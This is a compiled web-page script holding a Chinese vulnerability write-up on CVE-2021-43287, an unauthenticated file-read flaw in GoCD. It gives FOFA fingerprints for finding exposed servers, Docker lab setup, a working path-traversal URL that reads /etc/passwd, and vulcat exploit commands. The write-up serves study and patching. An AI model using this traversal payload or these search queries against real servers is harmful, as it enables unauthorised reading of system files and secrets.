(window.webpackJsonp=window.webpackJsonp||[]).push([[55],{371:function(t,s,a){"use strict";a.r(s);var e=a(7),r=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h1",{attrs:{id:"🧡-gocd-business-continuity-任意文件读取"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#🧡-gocd-business-continuity-任意文件读取"}},[t._v("#")]),t._v(" 🧡 GoCD Business Continuity 任意文件读取")]),t._v(" "),s("h2",{attrs:{id:"_1-漏洞信息"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-漏洞信息"}},[t._v("#")]),t._v(" 1）漏洞信息")]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("漏洞名称")]),t._v(" "),s("th",[t._v("受影响组件")]),t._v(" "),s("th",[t._v("漏洞类型")]),t._v(" "),s("th",[t._v("漏洞编号")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[t._v("GoCD Business Continuity任意文件读取")]),t._v(" "),s("td",[s("a",{attrs:{href:"https://github.com/gocd/gocd",target:"_blank",rel:"noopener noreferrer"}},[t._v("GoCD"),s("OutboundLink")],1)]),t._v(" "),s("td",[t._v("任意文件读取")]),t._v(" "),s("td",[s("a",{attrs:{href:"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43287",target:"_blank",rel:"noopener noreferrer"}},[t._v("CVE-2021-43287"),s("OutboundLink")],1)])])])]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("漏洞简介")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[s("p",[t._v("​GoCD Business Continuity 存在任意文件读取漏洞，未经身份验证的攻击者可以利用该漏洞来接管 CI/CD 管道，最终可在未授权的情况下造成任意文件读取，获取敏感API密钥等信息。")]),s("p",[t._v("影响版本：")]),t._v("20.6.0 <= GoCD <= 21.2.0")])])])]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("参考链接")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[s("ol",[s("li",[s("a",{attrs:{href:"https://avd.aliyun.com/detail?id=AVD-2021-43287",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://avd.aliyun.com/detail?id=AVD-2021-43287"),s("OutboundLink")],1)]),s("li",[s("a",{attrs:{href:"http://wiki.peiqi.tech/wiki/webserver/GoCD/GoCD%20plugin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-43287.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("http://wiki.peiqi.tech/wiki/webserver/GoCD/GoCD%20plugin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-43287.html"),s("OutboundLink")],1)])])])])])]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("补丁及修复方案")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[t._v("升级该组件至最新版本："),s("ol",[s("li",[s("a",{attrs:{href:"https://github.com/gocd/gocd",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://github.com/gocd/gocd"),s("OutboundLink")],1)]),s("li",[s("a",{attrs:{href:"https://www.gocd.org/",target:"_blank",rel:"noopener noreferrer"}},[t._v("https://www.gocd.org/"),s("OutboundLink")],1)])])])])])]),t._v(" "),s("table",[s("thead",[s("tr",[s("th",[t._v("网络空间测绘")])])]),t._v(" "),s("tbody",[s("tr",[s("td",[t._v("FOFA："),s("code",[t._v('title="Create a pipeline - Go"')])])]),t._v(" "),s("tr",[s("td",[t._v("FOFA："),s("code",[t._v('body="data-current-gocd-version"')])])]),t._v(" "),s("tr",[s("td",[t._v("FOFA："),s("code",[t._v('icon_hash="-1576282848"')])])])])]),t._v(" "),s("h2",{attrs:{id:"_2-漏洞环境"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_2-漏洞环境"}},[t._v("#")]),t._v(" 2）漏洞环境")]),t._v(" "),s("h3",{attrs:{id:"_2-1-方案一"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_2-1-方案一"}},[t._v("#")]),t._v(" 2.1）方案一")]),t._v(" "),s("p",[t._v("使用"),s("a",{attrs:{href:"https://hub.docker.com/layers/gocd/gocd-server/v21.1.0/images/sha256-7d68a41ac2656d1ccf3e8426df7be0df7b92b4a5e49d28486642200fc6604c86?context=explore",target:"_blank",rel:"noopener noreferrer"}},[t._v("官方镜像"),s("OutboundLink")],1),t._v("搭建漏洞环境")]),t._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("docker pull gocd/gocd-server:v21.1.0\ndocker run -itd -p 8153:8153 gocd/gocd-server:v21.1.0\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/01.png",alt:""}}),t._v(" "),s("p",[t._v("启动容器后，访问8153端口即可看到gocd的页面\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/02.png",alt:""}})]),t._v(" "),s("h3",{attrs:{id:"_2-2-方案二"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_2-2-方案二"}},[t._v("#")]),t._v(" 2.2）方案二")]),t._v(" "),s("p",[t._v("使用"),s("a",{attrs:{href:"https://github.com/fofapro/vulfocus",target:"_blank",rel:"noopener noreferrer"}},[t._v("vulfocus镜像"),s("OutboundLink")],1),t._v("搭建漏洞环境")]),t._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("docker pull vulfocus/gocd-cve_2021_43287\ndocker run -itd -p 8153:8153 vulfocus/gocd-cve_2021_43287\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/03.png",alt:""}}),t._v(" "),s("p",[t._v("启动容器后，如果看到以下页面，说明 gocd 正在加载，需要稍等一会\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/04.png",alt:""}})]),t._v(" "),s("p",[t._v("加载完成之后，即可看到 gocd 页面\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/05.png",alt:""}})]),t._v(" "),s("h2",{attrs:{id:"_3-漏洞复现-手工"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_3-漏洞复现-手工"}},[t._v("#")]),t._v(" 3）漏洞复现-手工")]),t._v(" "),s("p",[t._v("访问以下 URL 路径，会下载一个文本文件")]),t._v(" "),s("div",{staticClass:"language-url line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-url"}},[s("code",[s("span",{pre:!0,attrs:{class:"token path"}},[s("span",{pre:!0,attrs:{class:"token path-separator"}},[t._v("/")]),t._v("go"),s("span",{pre:!0,attrs:{class:"token path-separator"}},[t._v("/")]),t._v("add-on"),s("span",{pre:!0,attrs:{class:"token path-separator"}},[t._v("/")]),t._v("business-continuity"),s("span",{pre:!0,attrs:{class:"token path-separator"}},[t._v("/")]),t._v("api"),s("span",{pre:!0,attrs:{class:"token path-separator"}},[t._v("/")]),t._v("plugin")]),s("span",{pre:!0,attrs:{class:"token query"}},[s("span",{pre:!0,attrs:{class:"token query-delimiter"}},[t._v("?")]),s("span",{pre:!0,attrs:{class:"token pair"}},[s("span",{pre:!0,attrs:{class:"token key"}},[t._v("folderName")]),t._v("=")]),s("span",{pre:!0,attrs:{class:"token pair-delimiter"}},[t._v("&")]),s("span",{pre:!0,attrs:{class:"token pair"}},[s("span",{pre:!0,attrs:{class:"token key"}},[t._v("pluginName")]),t._v("="),s("span",{pre:!0,attrs:{class:"token value"}},[t._v("../../../../../../etc/passwd")])])]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/06.png",alt:""}}),t._v(" "),s("p",[t._v("打开该文件 即可看到 /etc/passwd 文件的内容\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/07.png",alt:""}})]),t._v(" "),s("p",[t._v("如果你不想下载多余的文件，则以 "),s("b",[t._v("“查看页面源代码”")]),t._v(" 的方式访问路径，即可直接看到文件内容，而无需下载文件")]),t._v(" "),s("div",{staticClass:"language-url line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-url"}},[s("code",[s("span",{pre:!0,attrs:{class:"token scheme"}},[t._v("view-source"),s("span",{pre:!0,attrs:{class:"token scheme-delimiter"}},[t._v(":")])]),t._v("<目标站点>/go/add-on/business-continuity/api/plugin"),s("span",{pre:!0,attrs:{class:"token query"}},[s("span",{pre:!0,attrs:{class:"token query-delimiter"}},[t._v("?")]),s("span",{pre:!0,attrs:{class:"token pair"}},[s("span",{pre:!0,attrs:{class:"token key"}},[t._v("folderName")]),t._v("=")]),s("span",{pre:!0,attrs:{class:"token pair-delimiter"}},[t._v("&")]),s("span",{pre:!0,attrs:{class:"token pair"}},[s("span",{pre:!0,attrs:{class:"token key"}},[t._v("pluginName")]),t._v("="),s("span",{pre:!0,attrs:{class:"token value"}},[t._v("../../../../../../etc/passwd")])])]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/08.png",alt:""}}),t._v(" "),s("h2",{attrs:{id:"_4-漏洞复现-vulcat"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_4-漏洞复现-vulcat"}},[t._v("#")]),t._v(" 4）漏洞复现-vulcat")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("python3 vulcat.py "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-u")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("URL"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-v")]),t._v(" cve-2021-43287\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/09.png",alt:""}}),t._v(" "),s("p",[t._v("你也可以使用 shell 模式，与 vulcat 持续交互并利用漏洞")]),t._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("python3 vulcat.py "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-u")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("URL"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("-v")]),t._v(" cve-2021-43287 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[t._v("--shell")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/10.png",alt:""}}),t._v(" "),s("p",[t._v("访问 /etc/hosts\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/11.png",alt:""}})]),t._v(" "),s("p",[t._v("访问 /etc/passwd\n"),s("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/vuepress/static/imgs/docs/vuln-db/gocd/cve-2021-43287/12.png",alt:""}})])])}),[],!1,null,null,null);s.default=r.exports}}]);